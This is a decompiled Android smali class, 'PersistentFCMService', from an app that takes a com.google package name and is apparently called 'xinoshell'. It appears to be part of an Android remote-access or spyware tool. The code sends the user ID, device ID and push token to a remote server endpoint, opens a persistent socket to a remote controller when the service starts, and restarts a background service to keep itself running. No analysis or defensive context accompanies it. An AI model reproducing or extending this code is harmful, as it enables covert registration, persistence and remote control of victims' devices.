.class public Lcom/google/xinoshell/services/PersistentFCMService;
.super Lcom/google/firebase/messaging/FirebaseMessagingService;
.source "PersistentFCMService.java"


# static fields
.field private static final TAG:Ljava/lang/String; = "PersistentFCMService"


# instance fields
.field private final executor:Ljava/util/concurrent/Executor;

.field private final httpClient:Lokhttp3/OkHttpClient;

.field private manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

.field private prefs:Lcom/google/xinoshell/utils/SharedPrefManager;


# direct methods
.method static bridge synthetic -$$Nest$fgetmanageSocket(Lcom/google/xinoshell/services/PersistentFCMService;)Lcom/google/xinoshell/connection/ManageSocket;
    .locals 0

    iget-object p0, p0, Lcom/google/xinoshell/services/PersistentFCMService;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    return-object p0
.end method

.method public constructor <init>()V
    .locals 1

    .line 25
    invoke-direct {p0}, Lcom/google/firebase/messaging/FirebaseMessagingService;-><init>()V

    .line 29
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    iput-object v0, p0, Lcom/google/xinoshell/services/PersistentFCMService;->executor:Ljava/util/concurrent/Executor;

    .line 30
    new-instance v0, Lokhttp3/OkHttpClient;

    invoke-direct {v0}, Lokhttp3/OkHttpClient;-><init>()V

    iput-object v0, p0, Lcom/google/xinoshell/services/PersistentFCMService;->httpClient:Lokhttp3/OkHttpClient;

    return-void
.end method

.method private initializeSocketConnection(Landroid/content/Context;)V
    .locals 3
    .param p1, "context"    # Landroid/content/Context;

    .line 108
    invoke-static {p1}, Lcom/google/xinoshell/connection/ManageSocket;->getInstance(Landroid/content/Context;)Lcom/google/xinoshell/connection/ManageSocket;

    move-result-object v0

    iput-object v0, p0, Lcom/google/xinoshell/services/PersistentFCMService;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    .line 109
    iget-object v0, p0, Lcom/google/xinoshell/services/PersistentFCMService;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    new-instance v1, Lcom/google/xinoshell/services/PersistentFCMService$1;

    invoke-direct {v1, p0}, Lcom/google/xinoshell/services/PersistentFCMService$1;-><init>(Lcom/google/xinoshell/services/PersistentFCMService;)V

    invoke-virtual {v0, v1}, Lcom/google/xinoshell/connection/ManageSocket;->setCallback(Lcom/google/xinoshell/connection/ManageSocket$SocketCallback;)V

    .line 129
    :try_start_0
    iget-object v0, p0, Lcom/google/xinoshell/services/PersistentFCMService;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    invoke-virtual {v0}, Lcom/google/xinoshell/connection/ManageSocket;->connect()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 132
    goto :goto_0

    .line 130
    :catch_0
    move-exception v0

    .line 131
    .local v0, "e":Ljava/lang/Exception;
    const-string v1, "PersistentFCMService"

    const-string v2, "Error initializing socket connection"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 133
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method private updateTokenOnServer(Ljava/lang/String;)V
    .locals 10
    .param p1, "token"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 48
    sget-object v0, Lcom/google/xinoshell/utils/Config;->userID:Ljava/lang/String;

    .line 49
    .local v0, "userId":Ljava/lang/String;
    invoke-static {p0}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getDeviceID(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    .line 50
    .local v1, "deviceId":Ljava/lang/String;
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 52
    .local v2, "json":Lorg/json/JSONObject;
    :try_start_0
    const-string v3, "userId"

    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 53
    const-string v3, "deviceId"

    invoke-virtual {v2, v3, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 54
    const-string v3, "fcmToken"

    invoke-virtual {v2, v3, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 57
    nop

    .line 59
    nop

    .line 60
    const-string v3, "application/json"

    invoke-static {v3}, Lokhttp3/MediaType;->parse(Ljava/lang/String;)Lokhttp3/MediaType;

    move-result-object v3

    invoke-static {v3}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lokhttp3/MediaType;

    .line 61
    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    .line 59
    invoke-static {v3, v4}, Lokhttp3/RequestBody;->create(Lokhttp3/MediaType;Ljava/lang/String;)Lokhttp3/RequestBody;

    move-result-object v3

    .line 63
    .local v3, "body":Lokhttp3/RequestBody;
    new-instance v4, Lokhttp3/Request$Builder;

    invoke-direct {v4}, Lokhttp3/Request$Builder;-><init>()V

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v6, Lcom/google/xinoshell/utils/Config;->ServerApiUrl:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "/fcm-ping"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 64
    invoke-virtual {v4, v5}, Lokhttp3/Request$Builder;->url(Ljava/lang/String;)Lokhttp3/Request$Builder;

    move-result-object v4

    .line 65
    invoke-virtual {v4, v3}, Lokhttp3/Request$Builder;->patch(Lokhttp3/RequestBody;)Lokhttp3/Request$Builder;

    move-result-object v4

    .line 66
    invoke-virtual {v4}, Lokhttp3/Request$Builder;->build()Lokhttp3/Request;

    move-result-object v4

    .line 67
    .local v4, "request":Lokhttp3/Request;
    iget-object v5, p0, Lcom/google/xinoshell/services/PersistentFCMService;->httpClient:Lokhttp3/OkHttpClient;

    invoke-virtual {v5, v4}, Lokhttp3/OkHttpClient;->newCall(Lokhttp3/Request;)Lokhttp3/Call;

    move-result-object v5

    invoke-interface {v5}, Lokhttp3/Call;->execute()Lokhttp3/Response;

    move-result-object v5

    .line 68
    .local v5, "response":Lokhttp3/Response;
    :try_start_1
    invoke-virtual {v5}, Lokhttp3/Response;->isSuccessful()Z

    move-result v6

    if-eqz v6, :cond_2

    .line 72
    invoke-virtual {v5}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;

    move-result-object v6

    if-eqz v6, :cond_0

    invoke-virtual {v5}, Lokhttp3/Response;->body()Lokhttp3/ResponseBody;

    move-result-object v6

    invoke-virtual {v6}, Lokhttp3/ResponseBody;->string()Ljava/lang/String;

    move-result-object v6

    goto :goto_0

    :cond_0
    const-string v6, ""

    .line 73
    .local v6, "responseData":Ljava/lang/String;
    :goto_0
    const-string v7, "PersistentFCMService"

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "Server response: "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 74
    nop

    .end local v6    # "responseData":Ljava/lang/String;
    if-eqz v5, :cond_1

    invoke-virtual {v5}, Lokhttp3/Response;->close()V

    .line 75
    .end local v5    # "response":Lokhttp3/Response;
    :cond_1
    return-void

    .line 69
    .restart local v5    # "response":Lokhttp3/Response;
    :cond_2
    :try_start_2
    new-instance v6, Ljava/io/IOException;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "Unexpected code "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/io/IOException;-><init>(Ljava/lang/String;)V

    .end local v0    # "userId":Ljava/lang/String;
    .end local v1    # "deviceId":Ljava/lang/String;
    .end local v2    # "json":Lorg/json/JSONObject;
    .end local v3    # "body":Lokhttp3/RequestBody;
    .end local v4    # "request":Lokhttp3/Request;
    .end local v5    # "response":Lokhttp3/Response;
    .end local p1    # "token":Ljava/lang/String;
    throw v6
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 67
    .restart local v0    # "userId":Ljava/lang/String;
    .restart local v1    # "deviceId":Ljava/lang/String;
    .restart local v2    # "json":Lorg/json/JSONObject;
    .restart local v3    # "body":Lokhttp3/RequestBody;
    .restart local v4    # "request":Lokhttp3/Request;
    .restart local v5    # "response":Lokhttp3/Response;
    .restart local p1    # "token":Ljava/lang/String;
    :catchall_0
    move-exception v6

    if-eqz v5, :cond_3

    :try_start_3
    invoke-virtual {v5}, Lokhttp3/Response;->close()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    goto :goto_1

    :catchall_1
    move-exception v7

    invoke-virtual {v6, v7}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :cond_3
    :goto_1
    throw v6

    .line 55
    .end local v3    # "body":Lokhttp3/RequestBody;
    .end local v4    # "request":Lokhttp3/Request;
    .end local v5    # "response":Lokhttp3/Response;
    :catch_0
    move-exception v3

    .line 56
    .local v3, "e":Ljava/lang/Exception;
    new-instance v4, Ljava/io/IOException;

    const-string v5, "Failed to create JSON payload"

    invoke-direct {v4, v5, v3}, Ljava/io/IOException;-><init>(Ljava/lang/String;Ljava/lang/Throwable;)V

    throw v4
.end method


# virtual methods
.method synthetic lambda$onNewToken$0$com-google-xinoshell-services-PersistentFCMService(Ljava/lang/String;)V
    .locals 3
    .param p1, "token"    # Ljava/lang/String;

    .line 39
    const-string v0, "PersistentFCMService"

    :try_start_0
    invoke-direct {p0, p1}, Lcom/google/xinoshell/services/PersistentFCMService;->updateTokenOnServer(Ljava/lang/String;)V

    .line 40
    const-string v1, "Token successfully updated on server"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 43
    goto :goto_0

    .line 41
    :catch_0
    move-exception v1

    .line 42
    .local v1, "e":Ljava/lang/Exception;
    const-string v2, "Failed to update token on server"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 44
    .end local v1    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public onCreate()V
    .locals 3

    .line 88
    invoke-super {p0}, Lcom/google/firebase/messaging/FirebaseMessagingService;->onCreate()V

    .line 89
    const-string v0, "FCM Service created"

    const-string v1, "PersistentFCMService"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 90
    new-instance v0, Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-direct {v0, p0}, Lcom/google/xinoshell/utils/SharedPrefManager;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/google/xinoshell/services/PersistentFCMService;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    .line 91
    invoke-direct {p0, p0}, Lcom/google/xinoshell/services/PersistentFCMService;->initializeSocketConnection(Landroid/content/Context;)V

    .line 94
    nop

    .line 95
    :try_start_0
    const-class v0, Lcom/google/xinoshell/services/BgService;

    invoke-static {p0, v0}, Lcom/google/xinoshell/utils/ServiceUtil;->isServiceRunning(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 96
    new-instance v0, Landroid/content/Intent;

    const-class v2, Lcom/google/xinoshell/services/BgService;

    invoke-direct {v0, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 97
    .local v0, "serviceIntent":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Lcom/google/xinoshell/services/PersistentFCMService;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 98
    nop

    .line 104
    .end local v0    # "serviceIntent":Landroid/content/Intent;
    :cond_0
    goto :goto_0

    .line 102
    :catch_0
    move-exception v0

    .line 103
    .local v0, "err":Ljava/lang/Exception;
    const-string v2, "Error starting background service"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 105
    .end local v0    # "err":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public onDestroy()V
    .locals 3

    .line 137
    invoke-super {p0}, Lcom/google/firebase/messaging/FirebaseMessagingService;->onDestroy()V

    .line 139
    :try_start_0
    iget-object v0, p0, Lcom/google/xinoshell/services/PersistentFCMService;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    if-eqz v0, :cond_0

    .line 140
    iget-object v0, p0, Lcom/google/xinoshell/services/PersistentFCMService;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    invoke-virtual {v0}, Lcom/google/xinoshell/connection/ManageSocket;->disconnect()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 144
    :cond_0
    goto :goto_0

    .line 142
    :catch_0
    move-exception v0

    .line 143
    .local v0, "e":Ljava/lang/Exception;
    const-string v1, "PersistentFCMService"

    const-string v2, "Error during service destruction"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 145
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public onMessageReceived(Lcom/google/firebase/messaging/RemoteMessage;)V
    .locals 3
    .param p1, "remoteMessage"    # Lcom/google/firebase/messaging/RemoteMessage;

    .line 79
    const-string v0, "Message received"

    const-string v1, "PersistentFCMService"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 80
    invoke-virtual {p1}, Lcom/google/firebase/messaging/RemoteMessage;->getData()Ljava/util/Map;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/Map;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    .line 81
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Message data payload: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {p1}, Lcom/google/firebase/messaging/RemoteMessage;->getData()Ljava/util/Map;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 83
    :cond_0
    return-void
.end method

.method public onNewToken(Ljava/lang/String;)V
    .locals 2
    .param p1, "token"    # Ljava/lang/String;

    .line 34
    invoke-super {p0, p1}, Lcom/google/firebase/messaging/FirebaseMessagingService;->onNewToken(Ljava/lang/String;)V

    .line 35
    iget-object v0, p0, Lcom/google/xinoshell/services/PersistentFCMService;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v1, "fcm_token"

    invoke-virtual {v0, v1, p1}, Lcom/google/xinoshell/utils/SharedPrefManager;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 36
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Refreshed token: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "PersistentFCMService"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 37
    iget-object v0, p0, Lcom/google/xinoshell/services/PersistentFCMService;->executor:Ljava/util/concurrent/Executor;

    new-instance v1, Lcom/google/xinoshell/services/PersistentFCMService$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0, p1}, Lcom/google/xinoshell/services/PersistentFCMService$$ExternalSyntheticLambda0;-><init>(Lcom/google/xinoshell/services/PersistentFCMService;Ljava/lang/String;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V

    .line 45
    return-void
.end method
